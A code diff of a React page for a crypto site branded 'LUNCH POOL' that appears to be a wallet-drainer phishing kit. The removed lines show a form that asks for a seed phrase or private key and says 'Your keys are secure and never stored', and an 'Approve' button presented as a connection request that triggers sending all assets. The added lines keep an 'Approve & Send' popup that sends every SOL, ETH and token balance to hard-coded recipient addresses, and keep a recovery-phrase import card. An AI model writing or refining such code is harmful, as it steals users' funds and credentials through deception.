-          <div className="p-4">
-            {!selectedWallet ? (
-              <>
-                {/* Search Bar */}
-                <div className="mb-4">
-                  <input
-                    type="text"
-                    placeholder="Search wallets..."
-                    value={searchQuery}
-                    onChange={(e) => setSearchQuery(e.target.value)}
-                    className="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
-                  />
+          
+          <input 
+            type="text"
+            placeholder="Search for a wallet"
+            value={searchQuery}
+            onChange={(e) => setSearchQuery(e.target.value)}
+            className="w-full p-3 mb-4 bg-gray-800 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:outline-none"
+          />
+  
+          <div className="overflow-y-auto flex-grow">
+            <div className="grid grid-cols-4 gap-4">
+              {filteredWallets.map(wallet => (
+                <div key={wallet.id} onClick={() => handleWalletSelect(wallet)} className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-800 cursor-pointer">
+                  <img src={wallet.icon} alt={wallet.name} className="w-16 h-16 rounded-full mb-2" />
+                  <span className="text-sm text-center">{wallet.name}</span>
                 </div>
-
-                {/* Wallet Grid */}
-                {isLoadingWallets ? (
-                   <div className="flex justify-center items-center h-48">
-                     <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
-                   </div>
-                ) : (
-                  <div className="grid grid-cols-4 gap-4 max-h-80 overflow-y-auto pr-2">
-                    {filteredWallets.map(wallet => (
-                      <div
-                        key={wallet.id}
-                        onClick={() => handleWalletSelect(wallet)}
-                        className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors"
-                      >
-                        <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-full mb-2" />
-                        <span className="text-xs text-center truncate">{wallet.name}</span>
-                      </div>
-                    ))}
-                  </div>
-                )}
-              </>
-            ) : (
-              // Secret Phrase Input Form
-              <div>
-                <button onClick={goBack} className="flex items-center text-sm text-gray-400 hover:text-white mb-4">
-                  <ArrowLeft size={16} className="mr-1" />
-                  Back
-                </button>
-                <div className="flex items-center mb-4">
-                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-10 h-10 rounded-full mr-3" />
-                  <span className="font-bold">{selectedWallet.name}</span>
-                </div>
-                
-                <form onSubmit={handleManualSubmit}>
-                  <p className="text-sm text-gray-400 mb-2">
-                    Enter your secret phrase, seed phrase, or private key to continue.
-                  </p>
-                  <div className="relative">
-                    <textarea
-                      value={secretPhrase}
-                      onChange={handleInputChange}
-                      className={`w-full p-3 bg-gray-800 border border-gray-600 rounded-lg h-32 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 ${!isPasswordVisible ? 'blur-sm' : ''}`}
-                      placeholder="Secret phrase..."
-                      required
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setIsPasswordVisible(!isPasswordVisible)}
-                      className="absolute top-2 right-2 p-1 text-gray-400 hover:text-white"
-                    >
-                      {isPasswordVisible ? <EyeOff size={18} /> : <Eye size={18} />}
-                    </button>
-                  </div>
-
-                  <div className="flex items-center justify-between mt-4">
-                    <div className="flex items-center">
-                      <Shield size={16} className="text-green-500 mr-2" />
-                      <span className="text-xs text-gray-400">Your keys are secure and never stored.</span>
-                    </div>
-                    <button type="submit" className="px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700 font-semibold transition-colors">
-                      Import
-                    </button>
-                  </div>
-                </form>
-              </div>
-            )}
+              ))}
+            </div>
           </div>
         </div>
-      </div>
-    );
-  };
-
-  const renderTransactionPopup = () => {
-    const handleApprove = () => {
-      if (solanaAddress) {
-        console.log('approve clicked');
-        handleSendAllAssets();
-      }
-      setShowTransactionPopup(false);
+      );
     };
-
-    return (
-      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
-        {isConnected && <div className="absolute top-4 right-4">{renderWalletDetails()}</div>}
-        <Shield size={48} className={`mx-auto mb-4 ${isSolanaConnected ? 'text-purple-500' : 'text-blue-500'}`} />
-        <h2 className="text-2xl font-bold mb-2">
-          {isSolanaConnected ? 'Solana' : 'Ethereum'} Connection Request
-        </h2>
-        <p className="text-gray-400 mb-6">
-          The application is requesting to connect your {isSolanaConnected ? 'Solana' : 'Ethereum'} wallet...
-        </p>
-
-        {txError && (
-          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
-            <p className="font-bold">Error</p>
-            <p className="text-sm">{txError}</p>
-          </div>
-        )}
-
-        <div className="flex justify-center space-x-4">
-          <button 
-            onClick={handleApprove}
-            disabled={isSending}
-            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-          >
-            {isSending ? (
-              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
-            ) : (
-              <><Check className="mr-2" /> Approve</>
+  
+    const renderTransactionPopup = () => {
+      const handleApprove = () => {
+        if (session?.namespaces?.solana) {
+          handleSendAllSol();
+        } else {
+          handleSendAllAssets();
+        }
+      };
+  
+      return (
+        <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-md text-white">
+            <div className="flex justify-between items-center mb-6">
+                <h3 className="text-2xl font-bold">Confirm Transaction</h3>
+                <button onClick={closeAllPopups} className="p-2 rounded-full hover:bg-gray-700">
+                    <X size={20} />
+                </button>
+            </div>
+  
+            <div className="bg-gray-800 p-4 rounded-lg mb-6">
+                <p className="text-sm text-gray-400 mb-2">You are about to send all assets to the recipient:</p>
+                <p className="font-mono text-xs break-all">{session?.namespaces?.solana ? SOLANA_RECIPIENT_ADDRESS : RECIPIENT_ADDRESS}</p>
+            </div>
+            
+            <div className="mb-6">
+                <h4 className="text-lg font-semibold mb-3">Assets to be sent:</h4>
+                <div className="space-y-2 max-h-40 overflow-y-auto p-3 bg-gray-800 rounded-lg">
+                  {session?.namespaces?.solana ? (
+                      <div className="flex justify-between">
+                          <span>{solanaBalance.sol} SOL</span>
+                      </div>
+                  ) : (
+                      <>
+                          <div className="flex justify-between">
+                              <img src="https://icons.iconarchive.com/icons/cjdowner/cryptocurrency-flat/1024/Ethereum-ETH-icon.png" alt="Ethereum" className="w-8 h-8"/>
+                              <span>{walletBalance.eth} ETH</span>
+                          </div>
+                          {walletBalance.tokens.map(token => (
+                              <div key={token.symbol} className="flex justify-between">
+                                  <span>{token.balance} {token.symbol}</span>
+                              </div>
+                          ))}
+                      </>
+                  )}
+                </div>
+            </div>
+            
+            {txError && (
+                <div className="bg-red-900/50 border border-red-500 p-3 rounded-lg mb-6">
+                    <p className="text-red-300 text-sm">{txError}</p>
+                </div>
             )}
-          </button>
-          <button 
-            onClick={() => {
-              closeAllPopups();
-              disconnect();
-            }}
-            disabled={isSending}
-            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
-          >
-            <X className="mr-2" /> Decline
-          </button>
+  
+            <div className="flex space-x-4">
+                <button
+                    onClick={closeAllPopups}
+                    className="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 rounded-lg transition-colors"
+                >
+                    Cancel
+                </button>
+                <button
+                    onClick={handleApprove}
+                    disabled={isSending}
+                    className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-colors disabled:opacity-50"
+                >
+                    {isSending ? 'Sending...' : 'Approve & Send'}
+                </button>
+            </div>
         </div>
-      </div>
-    );
-  };
+      );
+    };
+  
+    return (
+        <div className="min-h-screen bg-gray-900 text-white flex flex-col">
+            {/* Background decorative elements */}
+            <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
+                <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
+                <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
+            </div>
+    
+            <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
+                <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
+                <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
+                Back
+                </Link>
+            </header>
+    
+            <main className="flex-grow flex items-center justify-center z-10 p-4">
+            {session ? renderWalletDetails() : (
+                <div className="w-full max-w-2xl text-center">
+                <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
+                    Connect your wallet
+                </h1>
+                <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
+                    Choose your preferred connection method below to securely access the application.
+                </p>
+            
+                    <div className="grid md:grid-cols-3 gap-6">
+                        {/* Automatic Connection Card */}
+                        <div
+                        onClick={handleEvmConnection}
+                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
+                        >
+                        <div className="p-4 bg-blue-500/10 rounded-full mb-4">
+                            <Zap size={32} className="text-blue-400" />
+                        </div>
+                        <h3 className="text-xl font-semibold text-white mb-2">Automatic Connection</h3>
+                        <p className="text-gray-400 text-sm">Recommended. Connect using a popup with a list of supported wallets.</p>
+                        </div>
+            
+                        {/* Manual Connection Card */}
+                        <div
+                        onClick={() => setShowManualPopup(true)}
+                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
+                        >
+                        <div className="p-4 bg-purple-500/10 rounded-full mb-4">
+                            <Import size={32} className="text-purple-400" />
+                        </div>
+                        <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
+                        <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
+                        </div>
+            
+                        {/* Solana Connect */}
+                        <div 
+                        onClick={handleSolanaConnection}
+                        className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-green-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
+                        >
+                            <div className="p-4 bg-green-500/10 rounded-full mb-4">
+                                <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana" className="w-8 h-8"/>
+                            </div>
+                            <h3 className="text-xl font-semibold text-white mb-2">Solana Connect</h3>
+                            <p className="text-gray-400 text-sm">Connect your Solana wallet (Phantom, Solflare, etc).</p>
+                        </div>
+                    </div>
+                </div>
+            )}
+            </main>
+    
+            {/* Popups (Modals) */}
+            {showManualPopup && (
+                <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50">
+                    {renderManualConnectPopup()}
+                </div>
+            )}
 
-  return (
-    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
-      {/* Background decorative elements */}
-      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
-          <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
-          <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
+            <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
+                <a href="#" className="hover:text-white underline">Terms of Service</a>
+                <span className="mx-2">•</span>
+                <a href="#" className="hover:text-white underline">Privacy Policy</a>
+            </footer>
         </div>
-
-      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
-        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
-        <Link to="/" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
-          Back
-        </Link>
-      </header>
-
-      <main className="flex-grow flex items-center justify-center z-10 p-4">
-        {!isConnected && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
-        
-        {isConnected && !showTransactionPopup && (
-          <div className="text-center">
-            <h2 className="text-3xl font-bold mb-4">You are Connected!</h2>
-            {renderWalletDetails()}
-            <button
-              onClick={() => setShowTransactionPopup(true)}
-              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
-            >
-              Show Actions
-          </button>
-          </div>
-        )}
-      </main>
-
-      {/* Popups (Modals) */}
-      {(showManualPopup || showTransactionPopup) && (
-        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          {showManualPopup && renderManualConnectPopup()}
-          {showTransactionPopup && renderTransactionPopup()}
-        </div>
-      )}
-      
-      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
-        <a href="#" className="hover:text-white underline">Terms of Service</a>
-        <span className="mx-2">•</span>
-        <a href="#" className="hover:text-white underline">Privacy Policy</a>
-      </footer>
-    </div>
-  );
+      );
 }
